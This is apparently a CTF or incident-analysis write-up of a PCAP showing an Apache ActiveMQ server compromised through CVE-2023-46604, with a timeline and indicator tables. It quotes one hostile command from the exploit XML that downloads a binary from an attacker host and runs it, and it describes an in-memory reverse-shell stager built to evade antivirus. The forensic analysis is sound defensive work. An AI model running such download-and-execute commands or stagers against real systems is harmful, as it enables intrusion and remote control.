[[Writeup]]First, I loaded the PCAP into NetworkMiner and checked the Sessions tab. Port `61616` stood out immediately because all the other sessions looked like normal web traffic.

![[Pasted image 20261023005145.png]]

Looking up the port number confirmed that `61616` is used by the **OpenWire** protocol (Apache ActiveMQ), identifying `134.209.197.3` as our target server.

![[Pasted image 20261023005718.png]]

Looking further into the files extracted by NetworkMiner, I noticed a suspicious executable being sent to `134.209.197.3` from `128.199.52.72`, indicating that `128.199.52.72` is a file-hosting server used by the attacker. 

At the exact same time (`2023-12-12 13:38:28 UTC`), an XML file named `invoice.xml` was sent from `146.190.21.92`, suggesting that `invoice.xml` was used to exploit a vulnerability on the server and trigger the download of the `docker` binary.

![[Pasted image 20261023005830.png]]

To see how the exploit worked, I inspected `invoice.xml`. Inside, I found the command:
```bash
curl -s -o /tmp/docker http://128.199.52.72/docker; chmod +x /tmp/docker; ./tmp/docker
```

![[Pasted image 20261023011445.png]]

This matches **CVE-2023-46604**, a known remote code execution (RCE) flaw in **Apache ActiveMQ** that allows unauthenticated attackers to run arbitrary system commands via OpenWire deserialization.

![[Pasted image 20261023012005.png]]

Next, I analyzed the dropped `docker` binary. Running `strings` on it returned very little so I then checked its file hash on VirusTotal:

![[Pasted image 20261023013710.png]]

![[Pasted image 20261023013821.png]]

Reverse engineering the 250-byte ELF binary revealed that it is a lightweight Linux x86-64 reverse TCP stager. The C2 IP `146.190.21.92` and port `443` are hardcoded directly into the shellcode.

![[Pasted image 20261023020518.png]]

Once connected, the stager uses **direct memory execution** (`mmap` with `PROT_EXEC` → `sys_read` → `jmp rsi`). It pulls a second-stage payload straight into RAM and executes it without saving it to disk, evading standard disk-based antivirus scans and `noexec` restrictions.

![[Pasted image 20261023020825.png]]

### Attack Timeline

| Source IP | Action | Timestamp (UTC) |
| --- | --- | --- |
| `146.190.21.92` | Connects to `134.209.197.3` on OpenWire (port 61616) | 2023-12-12 13:38:27 |
| `146.190.21.92` | Sends `invoice.xml` exploit payload to `134.209.197.3` | 2023-12-12 13:38:28 |
| `128.199.52.72` | Server fetches `docker` executable via curl from file host | 2023-12-12 13:38:28 |
| `146.190.21.92` | `docker` connects back to C2 on port 443 (reverse shell) | 2023-12-12 13:38:28 |

### Key Indicators & Artifacts

| Role | Indicator | Description |
| --- | --- | --- |
| **Target Server** | `134.209.197.3` | Compromised Apache ActiveMQ server (Port 61616) |
| **Attacker / C2** | `146.190.21.92` | Initial exploit source & reverse shell handler (Port 443) |
| **File Host** | `128.199.52.72` | HTTP server hosting the malicious binary |
| **Exploit File** | `invoice.xml` | CVE-2023-46604 XML payload |
| **Dropped Binary** | `docker` | 250-byte Linux x86-64 reverse TCP stager |







